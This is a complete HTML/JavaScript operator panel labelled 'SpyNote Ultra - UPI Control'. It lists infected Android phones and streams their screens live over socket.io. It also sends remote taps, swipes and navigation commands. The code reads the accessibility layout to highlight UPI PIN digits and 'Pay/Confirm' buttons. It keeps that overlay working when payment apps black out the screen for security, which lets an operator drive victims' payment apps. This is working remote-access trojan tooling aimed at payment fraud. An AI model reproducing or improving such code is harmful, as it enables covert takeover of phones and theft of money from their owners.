<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Ultra - UPI Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: #0a0a0a; color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; background: rgba(0,0,0,0.95); 
            padding: 20px; max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 10px 0; background: #222; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border: 1px solid #444; }
        .device:hover { background: #444; transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; }

        #phone-frame {
            width: 380px; height: 820px; margin: 30px auto; 
            background: #111; border: 30px solid #222; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            image-rendering: pixelated;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 25px; z-index: 10;
        }
        .layout-element {
            position: absolute; background: rgba(0,255,136,0.25); 
            border: 2px solid #00ff88; border-radius: 6px; 
            transition: all 0.15s ease; cursor: pointer; font-family: monospace;
        }
        .layout-element:hover { 
            background: rgba(0,255,136,0.5) !important; 
            transform: scale(1.05); box-shadow: 0 0 15px #00ff88;
        }
        .pin-element { 
            background: rgba(255,69,0,0.6) !important; 
            border-color: #ff4500 !important; 
            box-shadow: 0 0 20px rgba(255,69,0,0.8) !important;
        }
        .pin-element:hover {
            background: rgba(255,69,0,0.9) !important;
            transform: scale(1.1) !important;
        }
        .pay-button {
            background: rgba(0,255,0,0.7) !important;
            border-color: #00ff00 !important;
            box-shadow: 0 0 25px rgba(0,255,0,0.9) !important;
        }

        #stats { 
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 15px; border-radius: 10px; font-size: 13px; 
            backdrop-filter: blur(10px); border: 1px solid #333; min-width: 200px;
        }
        #black-screen-notice {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(255,69,0,0.95); color: white; padding: 20px; 
            border-radius: 15px; text-align: center; font-weight: bold;
            display: none; backdrop-filter: blur(10px);
        }
        #controls { 
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 10px; background: rgba(0,0,0,0.9); padding: 15px 25px;
            border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #444;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-weight: 600; transition: all 0.3s; box-shadow: 0 5px 20px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,123,255,0.6); }
        .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
        .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
        .black-notice { background: linear-gradient(45deg, #ff4500, #ff6347) !important; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± Devices LIVE</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
        <div>Device: <span id="deviceName">-</span></div>
        <div id="layoutInfo" style="font-size: 11px; color: #aaa;">Layout: OFF</div>
        <div id="elementsCount" style="font-size: 11px; color: #00ff88;">0 elements</div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <div id="black-screen-notice">
            üîí SECURE SCREEN<br>
            <small style="color: #ffd700;">üìç UPI Layout Active - Click PINs!</small>
        </div>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">üó∫Ô∏è Layout</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0;
        let frameQueue = [];
        let isDragging = false, dragStart = {};
        let showLayout = true; // üî• Always ON by default
        let layoutElements = [];
        let canvas, ctx, overlayCtx, phoneFrame, blackNotice;
        let isBlackScreen = false;

        // üî• Initialize
        canvas = document.getElementById('screen-canvas');
        ctx = canvas.getContext('2d');
        overlayCtx = document.getElementById('layout-overlay').getContext('2d');
        phoneFrame = document.getElementById('phone-frame');
        blackNotice = document.getElementById('black-screen-notice');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE 30FPS';
            document.getElementById('status').style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            // üî• Handle black screen UPI mode
            isBlackScreen = data.screenBlack || false;
            if (isBlackScreen) {
                blackNotice.style.display = showLayout ? 'block' : 'none';
                canvas.style.opacity = '0.3';
            } else {
                blackNotice.style.display = 'none';
                canvas.style.opacity = '1';
            }
            
            frameQueue.push(data);
            if (frameQueue.length === 1) renderNextFrame();
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                if (!isBlackScreen) {
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                }
                
                // üî• Ultra smooth layout rendering
                if (showLayout && data.layout && data.layout.length > 0) {
                    renderLayoutOverlay(data.layout, rect);
                    document.getElementById('elementsCount').textContent = 
                        data.layout.length + ' UPI elements';
                } else {
                    document.getElementById('elementsCount').textContent = '0 elements';
                }
                
                if (frameQueue.length > 0) {
                    requestAnimationFrame(renderNextFrame);
                }
            };
            
            img.src = data.data ? `data:image/jpeg;base64,${data.data}` : '';
            deviceWidth = data.width || 1080;
            deviceHeight = data.height || 2400;
        }

        function renderLayoutOverlay(layout, rect) {
            const overlayCanvas = document.getElementById('layout-overlay');
            overlayCanvas.width = rect.width;
            overlayCanvas.height = rect.height;
            
            overlayCtx.clearRect(0, 0, rect.width, rect.height);
            layoutElements = [];
            
            layout.forEach((element, index) => {
                const x = (element.bounds.left / deviceWidth) * rect.width;
                const y = (element.bounds.top / deviceHeight) * rect.height;
                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                
                const text = element.text || element.contentDescription || '';
                const isPin = text.match(/\d/) || text.toLowerCase().includes('pin') ||
                             text.match(/^\d+$/) || text === '‚úì' || 
                             text === 'Done' || text === 'Pay' || text === 'Confirm';
                
                const isPayButton = text === 'Pay' || text === 'Confirm' || text === 'Done';
                
                // üî• Dynamic element class
                let elementClass = isPayButton ? 'pay-button' : 
                                  (isPin ? 'pin-element' : 'layout-element');
                
                overlayCtx.fillStyle = isPayButton ? 'rgba(0,255,0,0.4)' :
                                   (isPin ? 'rgba(255,69,0,0.5)' : 'rgba(0,255,136,0.3)');
                overlayCtx.strokeStyle = isPayButton ? '#00ff00' :
                                       (isPin ? '#ff4500' : '#00ff88');
                overlayCtx.lineWidth = 3;
                overlayCtx.strokeRect(x, y, w, h);
                
                // üî• Enhanced text rendering
                overlayCtx.font = 'bold 16px -apple-system, monospace';
                overlayCtx.fillStyle = isPayButton ? '#00ff00' :
                                     (isPin ? '#ff4500' : '#00ff88');
                overlayCtx.textAlign = 'left';
                overlayCtx.textBaseline = 'top';
                
                let displayText = text.slice(0, 10);
                if (isPin && text.match(/\d/)) displayText = 'üîê ' + displayText;
                if (isPayButton) displayText = 'üí∞ ' + displayText;
                
                overlayCtx.fillText(displayText, x + 8, y + 25);
                
                layoutElements.push({ 
                    x, y, w, h, isPin, isPayButton, element, 
                    centerX: (x + w/2), centerY: (y + h/2)
                });
            });
        }

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''}</small><br>
                        <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                        </span>
                    </div>
                `).join('') : '<div style="color:#666;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
            layoutElements = [];
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // üî• Touch + Mouse events
        ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                handleInput(e.clientX, e.clientY, event);
            });
        });

        ['touchstart', 'touchmove', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                const touch = e.touches[0] || e.changedTouches[0];
                handleInput(touch.clientX, touch.clientY, event);
            }, { passive: false });
        });

        function handleInput(clientX, clientY, event) {
            const coords = getScaledCoords(clientX, clientY);
            
            if (event === 'mousedown' || event === 'touchstart') {
                isDragging = true;
                dragStart = coords;
                sendTap(coords.x, coords.y); // Always send tap
            } else if ((event === 'mousemove' || event === 'touchmove') && isDragging) {
                sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
            } else if (event === 'mouseup' || event === 'touchend') {
                isDragging = false;
            }
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
            console.log('üëÜ Tap:', x, y);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice || !isDragging) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey, duration: 200 
            });
        }

        function sendBack() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); 
        }
        function sendHome() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); 
        }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            const info = document.getElementById('layoutInfo');
            btn.textContent = showLayout ? 'üìã Hide Layout' : 'üó∫Ô∏è Show Layout';
            btn.classList.toggle('active');
            info.textContent = `Layout: ${showLayout ? 'ON (UPI PINs LIVE)' : 'OFF'}`;
            info.style.color = showLayout ? '#00ff88' : '#aaa';
            
            blackNotice.style.display = (showLayout && isBlackScreen) ? 'block' : 'none';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // üî• PERFECT PIN CLICKING
        phoneFrame.addEventListener('click', (e) => {
            if (!showLayout || !currentDevice) return;
            
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            const x = (e.clientX - rect.left) * scaleX;
            const y = (e.clientY - rect.top) * scaleY;
            
            // üî• Find exact clicked element
            const clickedElement = layoutElements.find(el => 
                x >= el.element.bounds.left && x <= el.element.bounds.right &&
                y >= el.element.bounds.top && y <= el.element.bounds.bottom
            );
            
            if (clickedElement) {
                const tapX = clickedElement.element.bounds.centerX;
                const tapY = clickedElement.element.bounds.centerY;
                sendTap(tapX, tapY);
                
                console.log('üéØ PIN TAPPED:', clickedElement.element.text || 
                           clickedElement.element.contentDescription, 
                           `(${tapX.toFixed(0)}, ${tapY.toFixed(0)})`);
            }
        });

        // üî• Auto-connect first device
        setTimeout(() => {
            const firstDevice = document.querySelector('.device');
            if (firstDevice && !currentDevice) {
                firstDevice.click();
            }
        }, 2000);
    </script>
</body>
</html>
